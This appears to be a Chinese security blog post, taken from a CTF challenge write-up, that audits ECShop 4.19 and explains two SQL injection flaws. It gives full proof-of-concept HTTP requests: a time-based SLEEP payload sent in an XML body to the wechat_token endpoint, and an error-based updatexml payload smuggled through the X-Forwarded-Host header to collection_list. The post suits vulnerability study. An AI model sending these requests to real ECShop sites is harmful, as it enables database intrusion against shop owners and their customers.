<!DOCTYPE html>
<html lang=zh>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="ç‰ˆæœ¬ ï¼šv4.19 å¼ºç½‘æ‹Ÿæ€çš„ä¸€é“é¢˜ï¼Œç½‘ä¸Šå¤§å¤šéƒ½ä¸å…¬å¼€pocï¼Œè¿™é‡Œåˆ†äº«ä¸€ä¸‹æˆ‘çš„åˆ†æè¿‡ç¨‹ å®‰å…¨æœºåˆ¶å»ç½‘ä¸Šæœç´¢ä¸€ä¸‹å†å²æ¼æ´ä¼šå‘ç°ï¼ŒECshopè¿™å¥—ä»£ç çˆ†å‡ºè¿‡ä¸å°‘sqlæ³¨å…¥æ¼æ´  æ˜¯å› ä¸ºè¿™å¥—ç³»ç»Ÿå¾ˆå–œæ¬¢ç›´æ¥æŠŠå˜é‡æ‹¼æ¥åˆ°sqlè¯­å¥ä¸­ï¼ˆçœ‹èµ·æ¥å·²ç»è¢«å„ä½å¸ˆå‚…å®¡çƒ‚äº†ï¼‰ ä¿®ä¿®è¡¥è¡¥ä¹‹åï¼Œå³ä½¿ç›´æ¥æ‹¼æ¥å˜é‡ï¼Œä¹Ÿä¸å¤ªå¥½æ‰¾sqlæ³¨å…¥äº†ï¼Œä¸»è¦æ˜¯ä»¥ä¸‹ä¸¤ä¸ªåœ°æ–¹å¢åŠ äº†å®‰å…¨æ ¡éªŒ  æ¯ä¸ªæ–‡ä»¶éƒ½ä¼šå¼•å…¥åŠ è½½ &#x2F;includes&#x2F;init.p">
<meta property="og:type" content="article">
<meta property="og:title" content="Ecshop4.19ä»£ç å®¡è®¡">
<meta property="og:url" content="http://example.com/2025/11/17/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81Ecshop%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/index.html">
<meta property="og:site_name" content="Xsheep">
<meta property="og:description" content="ç‰ˆæœ¬ ï¼šv4.19 å¼ºç½‘æ‹Ÿæ€çš„ä¸€é“é¢˜ï¼Œç½‘ä¸Šå¤§å¤šéƒ½ä¸å…¬å¼€pocï¼Œè¿™é‡Œåˆ†äº«ä¸€ä¸‹æˆ‘çš„åˆ†æè¿‡ç¨‹ å®‰å…¨æœºåˆ¶å»ç½‘ä¸Šæœç´¢ä¸€ä¸‹å†å²æ¼æ´ä¼šå‘ç°ï¼ŒECshopè¿™å¥—ä»£ç çˆ†å‡ºè¿‡ä¸å°‘sqlæ³¨å…¥æ¼æ´  æ˜¯å› ä¸ºè¿™å¥—ç³»ç»Ÿå¾ˆå–œæ¬¢ç›´æ¥æŠŠå˜é‡æ‹¼æ¥åˆ°sqlè¯­å¥ä¸­ï¼ˆçœ‹èµ·æ¥å·²ç»è¢«å„ä½å¸ˆå‚…å®¡çƒ‚äº†ï¼‰ ä¿®ä¿®è¡¥è¡¥ä¹‹åï¼Œå³ä½¿ç›´æ¥æ‹¼æ¥å˜é‡ï¼Œä¹Ÿä¸å¤ªå¥½æ‰¾sqlæ³¨å…¥äº†ï¼Œä¸»è¦æ˜¯ä»¥ä¸‹ä¸¤ä¸ªåœ°æ–¹å¢åŠ äº†å®‰å…¨æ ¡éªŒ  æ¯ä¸ªæ–‡ä»¶éƒ½ä¼šå¼•å…¥åŠ è½½ &#x2F;includes&#x2F;init.p">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://example.com/imgs/img/image-20251117222708755.png">
<meta property="og:image" content="http://example.com/imgs/img/image-20251117223139960.png">
<meta property="og:image" content="http://example.com/imgs/img/image-20251117223543051.png">
<meta property="og:image" content="http://example.com/imgs/img/image-20251117223648661.png">
<meta property="og:image" content="http://example.com/imgs/img/image-20251117223745509.png">
<meta property="og:image" content="http://example.com/imgs/img/image-20251117224018264.png">
<meta property="og:image" content="http://example.com/imgs/img/image-20251117224438068.png">
<meta property="og:image" content="http://example.com/imgs/img/image-20251117224612949.png">
<meta property="og:image" content="http://example.com/imgs/img/image-20251117225151828.png">
<meta property="og:image" content="http://example.com/imgs/img/image-20251117230742066.png">
<meta property="og:image" content="http://example.com/imgs/img/image-20251117230918937.png">
<meta property="og:image" content="http://example.com/imgs/img/image-20251117231044074.png">
<meta property="og:image" content="http://example.com/imgs/img/image-20251117231140953.png">
<meta property="og:image" content="http://example.com/imgs/img/image-20251117231440342.png">
<meta property="og:image" content="http://example.com/imgs/img/image-20251117231503425.png">
<meta property="og:image" content="http://example.com/imgs/img/aa6e087f479c0cc395f24417c6fa08e.png">
<meta property="article:published_time" content="2025-11-17T15:45:35.047Z">
<meta property="article:modified_time" content="2025-11-17T16:02:21.628Z">
<meta property="article:author" content="Xsheep">
<meta property="article:tag" content="ç½‘ç»œå®‰å…¨åšå®¢">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/imgs/img/image-20251117222708755.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>Ecshop4.19ä»£ç å®¡è®¡</title>
    <!-- async scripts -->
    <!-- Google Analytics -->


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="Xsheep" type="application/atom+xml">
</head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="ç›®å½•"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="ç›®å½•"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="é¡¶éƒ¨" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">é¦–é¡µ</a></li><!--
     --><!--
       --><li><a href="/archives/">å½’æ¡£</a></li><!--
     --><!--
       --><li><a href="/about/">å…³äº</a></li><!--
     --><!--
       --><li><a href="/link/">link</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="ä¸Šä¸€ç¯‡" href="/2025/11/19/%E5%AE%9E%E6%88%98%E6%89%93%E7%82%B9%E6%A1%88%E4%BE%8B%E5%88%86%E4%BA%AB/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="ä¸‹ä¸€ç¯‡" href="/2025/03/27/IngressNightmare%E5%A4%8D%E7%8E%B0/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="è¿”å›é¡¶éƒ¨" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="åˆ†äº«æ–‡ç« " href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">ä¸Šä¸€ç¯‡</span>
      <span id="i-next" class="info" style="display:none;">ä¸‹ä¸€ç¯‡</span>
      <span id="i-top" class="info" style="display:none;">è¿”å›é¡¶éƒ¨</span>
      <span id="i-share" class="info" style="display:none;">åˆ†äº«æ–‡ç« </span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2025/11/17/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81Ecshop%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2025/11/17/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81Ecshop%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/&text=Ecshop4.19ä»£ç å®¡è®¡"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2025/11/17/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81Ecshop%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/&title=Ecshop4.19ä»£ç å®¡è®¡"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2025/11/17/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81Ecshop%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/&is_video=false&description=Ecshop4.19ä»£ç å®¡è®¡"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Ecshop4.19ä»£ç å®¡è®¡&body=Check out this article: http://example.com/2025/11/17/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81Ecshop%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2025/11/17/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81Ecshop%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/&title=Ecshop4.19ä»£ç å®¡è®¡"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2025/11/17/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81Ecshop%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/&title=Ecshop4.19ä»£ç å®¡è®¡"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2025/11/17/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81Ecshop%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/&title=Ecshop4.19ä»£ç å®¡è®¡"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2025/11/17/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81Ecshop%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/&title=Ecshop4.19ä»£ç å®¡è®¡"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2025/11/17/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81Ecshop%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/&name=Ecshop4.19ä»£ç å®¡è®¡&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2025/11/17/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81Ecshop%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/&t=Ecshop4.19ä»£ç å®¡è®¡"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6"><span class="toc-number">1.</span> <span class="toc-text">å®‰å…¨æœºåˆ¶</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A8%A1%E5%BC%8F%E5%8C%B9%E9%85%8D"><span class="toc-number">1.1.</span> <span class="toc-text">æ¨¡å¼åŒ¹é…</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5-1"><span class="toc-number">2.</span> <span class="toc-text">SQLæ³¨å…¥-1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5-2"><span class="toc-number">3.</span> <span class="toc-text">SQLæ³¨å…¥-2</span></a></li></ol>
      </div>
    
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        Ecshop4.19ä»£ç å®¡è®¡
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">Xsheep</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2025-11-17T15:45:35.047Z" class="dt-published" itemprop="datePublished">2025-11-17</time>
        
      
    </div>


      

      

    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <p><strong>ç‰ˆæœ¬</strong> ï¼šv4.19</p>
<p>å¼ºç½‘æ‹Ÿæ€çš„ä¸€é“é¢˜ï¼Œç½‘ä¸Šå¤§å¤šéƒ½ä¸å…¬å¼€pocï¼Œè¿™é‡Œåˆ†äº«ä¸€ä¸‹æˆ‘çš„åˆ†æè¿‡ç¨‹</p>
<h2 id="å®‰å…¨æœºåˆ¶"><a href="#å®‰å…¨æœºåˆ¶" class="headerlink" title="å®‰å…¨æœºåˆ¶"></a>å®‰å…¨æœºåˆ¶</h2><p>å»ç½‘ä¸Šæœç´¢ä¸€ä¸‹å†å²æ¼æ´ä¼šå‘ç°ï¼ŒECshopè¿™å¥—ä»£ç çˆ†å‡ºè¿‡ä¸å°‘sqlæ³¨å…¥æ¼æ´</p>
<p><img src="/imgs/img/image-20251117222708755.png" alt="image-20251117222708755"></p>
<p>æ˜¯å› ä¸ºè¿™å¥—ç³»ç»Ÿå¾ˆå–œæ¬¢ç›´æ¥æŠŠå˜é‡æ‹¼æ¥åˆ°sqlè¯­å¥ä¸­ï¼ˆçœ‹èµ·æ¥å·²ç»è¢«å„ä½å¸ˆå‚…å®¡çƒ‚äº†ï¼‰</p>
<p>ä¿®ä¿®è¡¥è¡¥ä¹‹åï¼Œå³ä½¿ç›´æ¥æ‹¼æ¥å˜é‡ï¼Œä¹Ÿä¸å¤ªå¥½æ‰¾sqlæ³¨å…¥äº†ï¼Œä¸»è¦æ˜¯ä»¥ä¸‹ä¸¤ä¸ªåœ°æ–¹å¢åŠ äº†å®‰å…¨æ ¡éªŒ</p>
<p><img src="/imgs/img/image-20251117223139960.png" alt="image-20251117223139960"></p>
<p>æ¯ä¸ªæ–‡ä»¶éƒ½ä¼šå¼•å…¥åŠ è½½ <code>/includes/init.php</code>ï¼Œå®‰å…¨çš„æ£€æŸ¥ä¸»è¦åœ¨è¿™ä¸ªæ–‡ä»¶é‡Œ</p>
<p>è¿›å…¥<code>init.php</code>å¯ä»¥çœ‹åˆ°ï¼ŒåŠ è½½äº†ä¸€ä¸ª<code>safety.php</code></p>
<p><img src="/imgs/img/image-20251117223543051.png" alt="image-20251117223543051"> </p>
<h3 id="æ¨¡å¼åŒ¹é…"><a href="#æ¨¡å¼åŒ¹é…" class="headerlink" title="æ¨¡å¼åŒ¹é…"></a>æ¨¡å¼åŒ¹é…</h3><p>åœ¨<code>safety.php</code> é‡Œï¼Œä½¿ç”¨æ­£åˆ™åŒ¹é…å»åŒ¹é…å±é™©æ¨¡å¼		</p>
<p><img src="/imgs/img/image-20251117223648661.png" alt="image-20251117223648661"></p>
<p>ä¼šå¯¹æ¯ä¸ªä¼ å…¥çš„å˜é‡è¿›è¡Œæ ¡éªŒ</p>
<p><img src="/imgs/img/image-20251117223745509.png" alt="image-20251117223745509"></p>
<p>åŒ¹é…çš„è¾ƒä¸ºå®Œå–„ï¼Œä¸æ˜¯å¾ˆå¥½ç»•</p>
<p>å¹¶ä¸”åœ¨æ­£åˆ™åŒ¹é…è¿‡åï¼Œè¿˜ä¼šåœ¨<code>init.php</code>é‡Œå¯¹ä¼ å…¥å˜é‡è¿›è¡Œè½¬ä¹‰</p>
<p><img src="/imgs/img/image-20251117224018264.png" alt="image-20251117224018264"></p>
<p>æ­£åˆ™åŒ¹é… +  è½¬ä¹‰ï¼Œçœ‹èµ·æ¥å·²ç»æ— æ³•sqlæ³¨å…¥äº†ï¼Œæ¥ä¸‹æ¥çœ‹å„ä½å¤§å“¥å¦‚ä½•ç»•è¿‡</p>
<h2 id="SQLæ³¨å…¥-1"><a href="#SQLæ³¨å…¥-1" class="headerlink" title="SQLæ³¨å…¥-1"></a>SQLæ³¨å…¥-1</h2><p>å…ˆæ”¾poc</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">GET /user.php?act=wechat_token HTTP/2</span><br><span class="line">Host: x.x.x.x</span><br><span class="line">Cookie: ECS[visit_times]=3; ECS_ID=591272e1d0fd2ee9027c0d7ab0d8922e92035a0d</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:145.0) Gecko/20100101 Firefox/145.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-Site: same-origin</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Priority: u=0, i</span><br><span class="line">Te: trailers</span><br><span class="line">Content-Length: 195</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;user&gt;</span><br><span class="line">    &lt;Event&gt;scan&lt;/Event&gt;</span><br><span class="line">    &lt;EventKey&gt;&#x27; AND (SELECT 1649 FROM (SELECT(SLEEP(5)))nsIj) AND &#x27;RKvz&#x27;=&#x27;RKvz&lt;/EventKey&gt;</span><br><span class="line">    &lt;FromUserName&gt;123456&lt;/FromUserName&gt;</span><br><span class="line">&lt;/user&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/imgs/img/image-20251117224438068.png" alt="image-20251117224438068"></p>
<p>æ ¹æ®pocå¯ä»¥çŸ¥é“ï¼Œ<code>user.php</code>çš„<code>wechat_token</code>æ¥å£çš„æ¼æ´ï¼Œçœ‹ä»£ç </p>
<p><img src="/imgs/img/image-20251117224612949.png" alt="image-20251117224612949"></p>
<p>å®ä¾‹åŒ–ä¸€ä¸ª<code>WeChatEvent</code> â€”&gt;  ç”¨phpä¼ªåè®®æ‹¿åˆ°è¯·æ±‚ä½“  â€”-&gt; ç„¶åxmlè½¬ä¸ºå­—ç¬¦ä¸²  â€”â€“&gt; æœ€åç”¨<code>call_user_func</code>å»è°ƒç”¨æ–¹æ³•<br>æ³¨æ„åˆ°ä¸¤ç‚¹ï¼Œ1. ä½¿ç”¨phpä¼ªåè®®ï¼Œå¯¼è‡´ä¼ å…¥çš„å‚æ•°å¹¶æ²¡æœ‰è½¬ä¹‰ï¼Œä¹Ÿä¸ä¼šè¢«æ£€æµ‹ï¼Œä¹‹å‰çš„æ£€æµ‹å…¨éƒ¨é’ˆå¯¹äºgetå’Œpostä¼ å‚</p>
<p>2.<code>call_user_func_array</code> çš„æ–¹æ³•åå’Œæ•°æ®æ˜¯ç”¨æˆ·å¯æ§</p>
<p>ç„¶åå»çœ‹<code>WeChatEvent</code>ç±»</p>
<p><img src="/imgs/img/image-20251117225151828.png" alt="image-20251117225151828"></p>
<p>å…¨éƒ¨æ˜¯ç›´æ¥æ‹¼æ¥ï¼Œæœ€åå¯¼è‡´æ³¨å…¥</p>
<h2 id="SQLæ³¨å…¥-2"><a href="#SQLæ³¨å…¥-2" class="headerlink" title="SQLæ³¨å…¥-2"></a>SQLæ³¨å…¥-2</h2><p>å·²çŸ¥å¤§é‡å­˜åœ¨å˜é‡ç›´æ¥æ‹¼æ¥sqlè¯­å¥ï¼Œä¸Šé¢æ˜¯åˆ©ç”¨phpä¼ªåè®®è¿›è¡Œçš„ç»•è¿‡ï¼Œè¿™é‡Œç¬¬äºŒå¤„åˆ©ç”¨çš„æ˜¯httpè¯·æ±‚å¤´<br>æ³¨å…¥ä½ç½®åœ¨ <code>user.php</code> çš„<code>collection_list</code> æ¥å£</p>
<p>è¿™ä¸ªæ˜¯åœ¨ 2.X&#x2F;3.X å°±çˆ†å‡ºæ¥çš„ï¼Œåªæ˜¯æ‹¿å…ˆå‰ç‰ˆæœ¬çš„æ‰“ä¸é€šï¼Œä½†æ˜¯åªéœ€ç®€å•ä¿®æ”¹å°±èƒ½ä½¿ç”¨ï¼ˆä¸ºä»€ä¹ˆå‘¢ï¼Œå› ä¸ºç‰ˆæœ¬ä¸åŒå¯¼è‡´çš„ehashä¸åŒç½¢äº†ğŸ¤ªï¼‰</p>
<p>poc</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">GET /user.php?act=collection_list HTTP/2</span><br><span class="line">Host: x.x.x.x</span><br><span class="line">Cookie: ECS[visit_times]=3; ECS_ID=591272e1d0fd2ee9027c0d7ab0d8922e92035a0d; ECSCP_ID=4b2401b5af4843a95a7e19b45f5acb32ec20802b</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:145.0) Gecko/20100101 Firefox/145.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">X-Forwarded-Host: 145ea207d7a2b68c49582d2d22adf953auser_account|a:2:&#123;s:7:&quot;user_id&quot;;s:38:&quot;0&#x27;-(updatexml(1,repeat(user(),2),1))-&#x27;&quot;;s:7:&quot;payment&quot;;s:1:&quot;4&quot;;&#125;|145ea207d7a2b68c49582d2d22adf953a</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-Site: same-origin</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Priority: u=0, i</span><br><span class="line">Te: trailers</span><br></pre></td></tr></table></figure>

<p>åˆ©ç”¨é“¾</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url() --&gt; get_domain()æ›¿æ¢å˜é‡ --&gt; display() --&gt; insert_mod() è¿™é‡Œåˆ†å‰²å‚æ•° --&gt; æœ€åå˜é‡æ‹¼æ¥sqlè¯­å¥</span><br></pre></td></tr></table></figure>

<p>å…ˆçœ‹<code>insert_mod</code>æ–¹æ³•<br><img src="/imgs/img/image-20251117230742066.png" alt="image-20251117230742066"></p>
<p>å¯¹ä¼ å…¥çš„å‚æ•° ä»¥<code>|</code>åˆ†å‰²ï¼Œç„¶åè°ƒç”¨å‡½æ•°ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å¯ä»¥ä»»æ„è°ƒç”¨<code>insert_</code>å¼€å¤´çš„æ–¹æ³•ï¼Œå‚æ•°ä¹Ÿæ˜¯ç”±æˆ‘ä»¬å®š<br>æ‰€ä»¥å»æ‰¾æ»¡è¶³æ¡ä»¶çš„å‡½æ•°<br><img src="/imgs/img/image-20251117230918937.png" alt="image-20251117230918937"></p>
<p>åœ¨<code>lib_clips.php</code>é‡Œå°±æœ‰è¿™ä¹ˆä¸€ä¸ªå‡½æ•°</p>
<p><code>collection_list</code> æ¥å£ä¹Ÿä¼šåŒ…å«è¿™ä¸ªæ–‡ä»¶</p>
<p><img src="/imgs/img/image-20251117231044074.png" alt="image-20251117231044074"></p>
<p>æ¥ä¸‹æ¥çœ‹urlæ–¹æ³•</p>
<p>è§¦å‘<code>get_domain</code></p>
<p><img src="/imgs/img/image-20251117231140953.png" alt="image-20251117231140953"></p>
<p><code>get_domain</code>ä¼šæŠŠhttpè¯·æ±‚å¤´ä¸­çš„<code>HTTP_X_FORWARDED_HOST</code>èµ‹å€¼ç»™<code>$host</code>, ç„¶åè¿”å›</p>
<p><img src="/imgs/img/image-20251117231440342.png" alt="image-20251117231440342"></p>
<p>smartyæ³¨å†Œï¼Œè¿”å›çš„hostè¢«æ³¨å†Œè¿›æ¨¡æ¿å˜é‡</p>
<p><img src="/imgs/img/image-20251117231503425.png" alt="image-20251117231503425"></p>
<p>æœ€ååœ¨displayå‡½æ•°é‡Œè§¦å‘sinkç‚¹ï¼Œå®Œæˆé—­ç¯</p>
<p>æ‰€ä»¥æœ€åçš„æµç¨‹å°±æ˜¯ </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url() --&gt; get_domain()æ›¿æ¢å˜é‡ --&gt; assignæ³¨å†Œå˜é‡--&gt; displayçš„æ—¶å€™å¯¹å˜é‡è¿›è¡Œå¤„ç†ï¼Œè§¦å‘insert_mod()  --&gt; insert_mod è¿™é‡Œåˆ†å‰²å‚æ•°ï¼Œè°ƒç”¨ç”¨æˆ·è®¾å®šå¥½çš„å‡½æ•°å’Œå‚æ•° --&gt; æœ€åè°ƒç”¨å‡½æ•°ï¼Œä¼ å…¥å‚æ•°æ‹¼æ¥sqlè¯­å¥</span><br></pre></td></tr></table></figure>

<p><img src="/imgs/img/aa6e087f479c0cc395f24417c6fa08e.png" alt="aa6e087f479c0cc395f24417c6fa08e"></p>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/">é¦–é¡µ</a></li>
        
          <li><a href="/archives/">å½’æ¡£</a></li>
        
          <li><a href="/about/">å…³äº</a></li>
        
          <li><a href="/link/">link</a></li>
        
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6"><span class="toc-number">1.</span> <span class="toc-text">å®‰å…¨æœºåˆ¶</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A8%A1%E5%BC%8F%E5%8C%B9%E9%85%8D"><span class="toc-number">1.1.</span> <span class="toc-text">æ¨¡å¼åŒ¹é…</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5-1"><span class="toc-number">2.</span> <span class="toc-text">SQLæ³¨å…¥-1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5-2"><span class="toc-number">3.</span> <span class="toc-text">SQLæ³¨å…¥-2</span></a></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2025/11/17/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81Ecshop%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2025/11/17/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81Ecshop%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/&text=Ecshop4.19ä»£ç å®¡è®¡"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2025/11/17/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81Ecshop%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/&title=Ecshop4.19ä»£ç å®¡è®¡"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
